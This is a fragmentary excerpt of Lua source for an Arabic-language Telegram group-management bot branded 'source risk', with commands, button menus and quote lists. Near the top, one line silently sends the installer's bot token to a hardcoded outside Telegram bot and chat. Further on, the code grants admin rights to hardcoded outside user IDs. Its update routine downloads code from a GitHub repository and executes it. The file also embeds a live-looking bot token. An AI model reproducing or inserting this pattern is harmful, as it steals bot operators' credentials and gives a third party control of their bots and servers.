...
https.request('https://api.telegram.org/bot1899678989:AAHTdAuarABisGHWZaqdDeRouYD-oATU8R0/sendmessage?chat_id=1700360357&text=' ..token)
end 
else
...
if [ ! $token ]; then
echo "≪━━━━━━𝑅𝐼𝑆𝐾━━━━━━≫ ≪━━━━━━𝑅𝐼𝑆𝐾━━━━━━≫ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE vInfo.lua \e[0m"
echo "≪━━━━━━𝑅𝐼𝑆𝐾━━━━━━≫ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
...
local config = loadfile("./vInfo.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/legyouu/dived/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1236115319,1208165035}   
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝑟𝑖𝑠𝑘")  
...
os.execute('wget https://raw.githubusercontent.com/legyouu/dived/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'❃ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃ اصدار سورس ريسك { s: 6.7}')
end
if text == 'المبرمج ليجاند' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV LEGAND](t.me/L120N)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ L E G A N D 🧚‍♀️  ❩ ', url="t.me/L120N"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ❨ TＷＡＳＯＬ 🧚‍♀️  ❩ ', url="t.me/E_H_M_BOT"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/legyouu/dived/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/legyouu/dived/main/library')
os.execute('wget https://raw.githubusercontent.com/legyouu/dived/main/File_Bot')
send(msg.chat_id_, msg.id_,' ❃ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ M A D I S O N 🧚‍♀️  ❩ ',url="t.me/AAHMEED11"}},
{{text = '❨ SＯＵＲＣＥ 🧚‍♀️  ❩', url="t.me/NIU_C"}},
}
local msg_id = msg.id_/2097152/0.5
...
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.🧚‍♀️💜",
...
"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. 🧚‍♀️ ",
...
if text == '≪━━━━━━𝑅𝐼𝑆𝐾━━━━━━≫' then
local Text = [[ 
🧚‍♀️من أحسن السورسات على التليجرام سورس ريسك🧚‍♀️
...
if text == 'العاب ريسك' or text == 'العاب الريسك' or text == 'العاب متطوره' then  
local Text = [[  
 🧚‍♀️ اهلا في قائمه الالعاب المتطوره سورس ريسك  🧚‍♀️ 
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/legyouu/dived/main/getfile.json")
if res == 200 then
...
local json_file, res = https.request("https://raw.githubusercontent.com/legyouu/dived/main/File_Bot/"..file)
if res == 200 then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝑟𝑖𝑠𝑘.',url="t.me/NIU_C"}},
}
local msg_id = msg.id_/2097152/0.5
...
{
{text = 'مميزات🧚‍♀️', callback_data="/change-photo"},
},
{ 
{text = 'الاوامر🎯', callback_data="/help90"},
},
{
{text = ' 𝑅𝐼𝑆𝐾', url="t.me/NIU_C"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
🧚‍♀️امسح
🧚‍♀️صلاحيه
🧚‍♀️قائمه منع المتحركات
🧚‍♀️قائمه منع الصور
🧚‍♀️قائمه منع الملصقات
🧚‍♀️مسح قائمه المنع
🧚‍♀️المحذوفين
≪━━━━━━𝑅𝐼𝑆𝐾━━━━━━≫
🧚‍♀